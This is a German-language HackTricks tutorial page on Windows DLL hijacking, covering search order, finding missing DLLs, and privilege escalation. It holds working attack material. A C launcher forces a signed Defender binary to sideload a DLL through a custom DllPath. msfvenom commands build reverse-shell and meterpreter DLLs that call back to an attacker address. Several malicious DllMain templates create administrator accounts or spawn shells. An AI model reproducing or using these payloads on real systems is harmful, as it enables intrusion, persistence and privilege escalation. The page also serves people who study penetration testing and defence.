# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Grundlegende Informationen

DLL Hijacking beinhaltet das Manipulieren einer vertrauten Anwendung, sodass sie eine bösartige DLL lädt. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Er wird hauptsächlich für Codeausführung, das Erlangen von Persistence und seltener für Privilegieneskalation genutzt. Obwohl der Fokus hier auf Eskalation liegt, bleibt die Methode des Hijackings je nach Ziel gleich.

### Häufige Techniken

Mehrere Methoden werden für DLL Hijacking eingesetzt, deren Wirksamkeit vom DLL-Ladeverhalten der Anwendung abhängt:

1. **DLL Replacement**: Ersetzen einer legitimen DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der ursprünglichen DLL zu erhalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad, der vor dem legitimen liegt, und Ausnutzen des Suchmusters der Anwendung.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, die eine Anwendung lädt, weil sie glaubt, dass es sich um eine benötigte, aber nicht existierende DLL handelt.
4. **DLL Redirection**: Ändern von Suchparametern wie %PATH% oder .exe.manifest / .exe.local Dateien, um die Anwendung auf die bösartige DLL zu verweisen.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch ein bösartiges Pendant im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading verbunden ist.
6. **Relative Path DLL Hijacking**: Ablegen der bösartigen DLL in einem benutzerkontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich den Binary Proxy Execution Techniken.

## Fehlende DLLs finden

Die gebräuchlichste Methode, fehlende DLLs in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von sysinternals und das **Setzen** der **folgenden 2 Filter**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

und dann nur die **Dateisystemaktivität** anzeigen:

![](<../../images/image (314).png>)

Wenn Sie allgemein nach **fehlenden DLLs** suchen, lassen Sie das für einige **Sekunden** laufen.  
Wenn Sie nach einer **fehlenden DLL in einer bestimmten ausführbaren Datei** suchen, sollten Sie einen **weiteren Filter wie "Process Name" "contains" "<exec name>"** setzen, die Ausführung starten und das Erfassen der Events stoppen.

## Ausnutzen fehlender DLLs

Um Privilegien zu eskalieren, ist die beste Chance, eine **DLL zu schreiben, die ein privilegierter Prozess zu laden versucht**, an einem **Ort, an dem sie gesucht wird**. Daher können wir eine DLL in einem **Ordner** schreiben, der bei der Suche **vor** dem Ordner liegt, in dem die **originale DLL** liegt (ungewöhnlicher Fall), oder wir können in einem Ordner schreiben, in dem die DLL gesucht wird, während die originale **DLL in keinem Ordner existiert**.

### DLL-Suchreihenfolge

**In der** [Microsoft documentation] **finden Sie, wie DLLs genau geladen werden.**

Windows-Anwendungen suchen nach DLLs, indem sie einer Reihe vordefinierter Suchpfade in einer bestimmten Reihenfolge folgen. Das Problem des DLL Hijackings entsteht, wenn eine schädliche DLL gezielt in einem dieser Verzeichnisse platziert wird, sodass sie vor der authentischen DLL geladen wird. Eine Lösung, dies zu verhindern, ist sicherzustellen, dass die Anwendung absolute Pfade verwendet, wenn sie auf benötigte DLLs verweist.

Sie können die **DLL-Suchreihenfolge auf 32-Bit** Systemen unten sehen:

1. The directory from which the application loaded.
2. The system directory. Use the [GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Das ist die **Standard**-Suchreihenfolge mit **SafeDllSearchMode** aktiviert. Wenn es deaktiviert ist, steigt das aktuelle Verzeichnis auf Platz zwei. Um diese Funktion zu deaktivieren, erstellen Sie den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setzen ihn auf 0 (Standard ist aktiviert).

Wenn die Funktion [LoadLibraryEx](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachten Sie schließlich, dass **eine DLL durch Angabe des absoluten Pfads** geladen werden kann, anstatt nur des Namens. In diesem Fall wird die DLL **nur in diesem Pfad** gesucht (wenn die DLL Abhängigkeiten hat, werden diese beim Laden einfach nach Namen gesucht).

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu ändern, die hier nicht erklärt werden.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Methode, um deterministisch den DLL-Suchpfad eines neu erstellten Prozesses zu beeinflussen, besteht darin, das DllPath-Feld in RTL_USER_PROCESS_PARAMETERS zu setzen, wenn der Prozess mit den nativen ntdll-APIs erstellt wird. Indem man hier ein vom Angreifer kontrolliertes Verzeichnis angibt, kann ein Zielprozess, der eine importierte DLL nach Namen auflöst (kein absoluter Pfad und keine sicheren Ladeflags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Kernidee
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Hinweise/Einschränkungen
- Dies betrifft den erzeugten Child-Prozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess beeinflusst.
- Das Ziel muss eine DLL nach Namen importieren oder mit LoadLibrary laden (kein absoluter Pfad und nicht unter Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und hartkodierte absolute Pfade können nicht gehijackt werden. Forwarded exports und SxS können die Präzedenz ändern.

Minimales C-Beispiel (ntdll, wide strings, vereinfachte Fehlerbehandlung):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Platziere eine bösartige xmllite.dll (die die benötigten Funktionen exportiert oder an die echte weiterleitet) in deinem DllPath-Verzeichnis.
- Starte ein signiertes Binary, das bekanntermaßen xmllite.dll per Name sucht, und nutze die oben beschriebene Technik. Der Loader löst den Import über den angegebenen DllPath auf und sideloadet deine DLL.

Diese Technik wurde in-the-wild beobachtet und treibt multi-stage sideloading chains an: ein initialer Launcher legt eine Hilfs-DLL ab, die dann ein von Microsoft signiertes, hijackable Binary mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem Staging-Verzeichnis zu erzwingen.


#### Ausnahmen bei der DLL-Suchreihenfolge aus der Windows-Dokumentation

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Privilegien eskalieren

**Voraussetzungen**:

- Identifiziere einen Prozess, der unter **anderen Privilegien** läuft oder laufen wird (horizontal or lateral movement) und dem **eine DLL fehlt**.
- Stelle sicher, dass **Schreibzugriff** für ein **Verzeichnis** vorhanden ist, in dem nach der **DLL** gesucht wird. Dieser Ort kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Ja, die Voraussetzungen sind schwer zu finden, da es **standardmäßig ungewöhnlich ist, ein privilegiertes ausführbares Programm zu finden, dem eine DLL fehlt** und es noch **ungewöhnlicher ist, Schreibrechte in einem Systempfad-Ordner zu haben** (das hat man standardmäßig nicht). Aber in fehlkonfigurierten Umgebungen ist das möglich.\
Falls du Glück hast und die Voraussetzungen erfüllst, kannst du dir das [UACME](https://github.com/hfiref0x/UACME) Projekt ansehen. Auch wenn das **Hauptziel des Projekts die Umgehung von UAC ist**, findest du dort möglicherweise einen **PoC** eines Dll hijaking für die entsprechende Windows-Version, den du verwenden kannst (wahrscheinlich musst du nur den Pfad des Ordners ändern, in dem du Schreibrechte hast).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die Berechtigungen aller Verzeichnisse im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Sie können auch die Imports eines executable und die Exports einer dll mit folgendem überprüfen:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking ausnutzt, um Privilegien zu eskalieren** mit Schreibrechten in einem **System Path folder** siehe:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) wird prüfen, ob du Schreibrechte auf einen Ordner innerhalb des system PATH hast.\
Weitere interessante automatisierte Tools zur Entdeckung dieser Verwundbarkeit sind die **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll_.

### Beispiel

Wenn du ein ausnutzbares Szenario findest, ist eine der wichtigsten Maßnahmen, um es erfolgreich auszunutzen, eine dll zu erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm von ihr importiert. Beachte außerdem, dass Dll Hijacking nützlich sein kann, um [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) oder von[ **High Integrity to SYSTEM**](#from-high-integrity-to-system)**.** Ein Beispiel dafür, **how to create a valid dll**, findest du in dieser dll hijacking-Studie, die sich auf dll hijacking zur Ausführung konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **einfache dll-Codes**, die als **Vorlagen** nützlich sein können oder zum Erstellen einer **dll mit nicht benötigten exportierten Funktionen**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Grundsätzlich ist ein **Dll proxy** eine dll, die in der Lage ist, **bei Laden deinen bösartigen Code auszuführen**, aber auch die erwartete Funktionalität bereitzustellen und zu funktionieren, indem sie alle Aufrufe an die echte Library weiterleitet.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du ein ausführbares Programm angeben und die Library auswählen, die du proxifizieren möchtest, und eine proxified dll generieren oder die Dll angeben und eine proxified dll generieren.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Hole einen meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erstelle einen Benutzer (x86, ich habe keine x64-Version gesehen):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Dein eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **mehrere Funktionen exportieren muss**, die vom Opferprozess geladen werden. Wenn diese Funktionen nicht existieren, wird die Binärdatei sie nicht laden können und der **exploit wird fehlschlagen**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referenzen

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
